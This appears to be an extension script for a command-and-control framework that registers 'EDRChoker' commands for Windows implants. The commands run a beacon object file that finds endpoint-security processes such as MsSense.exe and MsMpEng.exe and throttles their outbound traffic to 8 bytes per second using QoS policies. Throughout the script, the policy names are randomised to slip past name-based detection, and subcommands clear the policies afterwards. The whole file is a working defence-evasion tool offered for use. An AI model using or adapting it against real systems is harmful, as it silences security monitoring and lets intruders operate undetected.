var metadata = {
    name: "EDRChoker-BOF",
    description: "Throttle EDR outbound traffic via Windows QoS (policy-based bandwidth cap)"
};

/// Session-stable randomized policy Name prefix.
/// Defeats naive Name-based heuristics and scopes clearall to THIS session's
/// policies (fixes upstream EXE's unconditional cleanup bug).

var _prefix_pool = [
    "TelemetryPriority_",
    "AppNetPolicy_",
    "WindowsQosApp_",
    "SystemNetPolicy_",
    "QosAppRule_",
    "NetworkPriority_",
    "EndpointBWPolicy_",
    "ServiceQosRule_"
];

function _hex4() {
    return ("0000" + Math.floor(Math.random() * 65536).toString(16)).slice(-4);
}

var _prefix = _prefix_pool[Math.floor(Math.random() * _prefix_pool.length)]
    + _hex4() + _hex4() + "_";

/// COMMANDS

var _cmd_throttleedr = ax.create_command("throttleedr",
    "Enumerate running EDR processes and throttle each (8 B/s cap via QoS)",
    "edrchoker throttleedr");
_cmd_throttleedr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_params = ax.bof_pack("cstr,cstr,cstr", ["throttleedr", "", _prefix]);
    let bof_path = ax.script_dir() + "_bin/edrchoker.x64.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "EDRChoker: throttle all detected EDR");
});


var _cmd_throttle = ax.create_command("throttle",
    "Throttle one process by name (basename or full path)",
    "edrchoker throttle MsSense.exe\nedrchoker throttle \"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"");
_cmd_throttle.addArgString("process", true);
_cmd_throttle.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let proc = parsed_json["process"];
    let bof_params = ax.bof_pack("cstr,cstr,cstr", ["throttle", proc, _prefix]);
    let bof_path = ax.script_dir() + "_bin/edrchoker.x64.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "EDRChoker: throttle " + proc);
});


var _cmd_clearall = ax.create_command("clearall",
    "Remove all QoS policies created by this session (prefix-scoped)",
    "edrchoker clearall");
_cmd_clearall.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_params = ax.bof_pack("cstr,cstr,cstr", ["clearall", "", _prefix]);
    let bof_path = ax.script_dir() + "_bin/edrchoker.x64.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "EDRChoker: clear all session policies");
});


var _cmd_clear = ax.create_command("clear",
    "Remove one QoS policy by exact Name",
    "edrchoker clear AppNetPolicy_a1b2c3d4_e5f6a7b8");
_cmd_clear.addArgString("policyname", true);
_cmd_clear.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let name = parsed_json["policyname"];
    let bof_params = ax.bof_pack("cstr,cstr,cstr", ["clear", name, _prefix]);
    let bof_path = ax.script_dir() + "_bin/edrchoker.x64.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "EDRChoker: clear policy " + name);
});


var _cmd_list = ax.create_command("list",
    "Show session state, our policies, running EDR processes, and throttle status",
    "edrchoker list");
_cmd_list.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_params = ax.bof_pack("cstr,cstr,cstr", ["list", "", _prefix]);
    let bof_path = ax.script_dir() + "_bin/edrchoker.x64.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "EDRChoker: list status");
});


var _cmd_state = ax.create_command("state",
    "Print the session-random policy Name prefix",
    "edrchoker state");
_cmd_state.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_params = ax.bof_pack("cstr,cstr,cstr", ["state", "", _prefix]);
    let bof_path = ax.script_dir() + "_bin/edrchoker.x64.o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "EDRChoker: session state");
});


var cmd_edrchoker = ax.create_command("edrchoker",
    "Throttle EDR outbound traffic via Windows QoS (policy-based bandwidth cap)");
cmd_edrchoker.addSubCommands([_cmd_throttleedr, _cmd_throttle, _cmd_clearall, _cmd_clear, _cmd_list, _cmd_state]);

var group_edrchoker = ax.create_commands_group("EDRChoker-BOF", [cmd_edrchoker]);
ax.register_commands_group(group_edrchoker, ["beacon", "gopher", "kharon"], ["windows"], []);
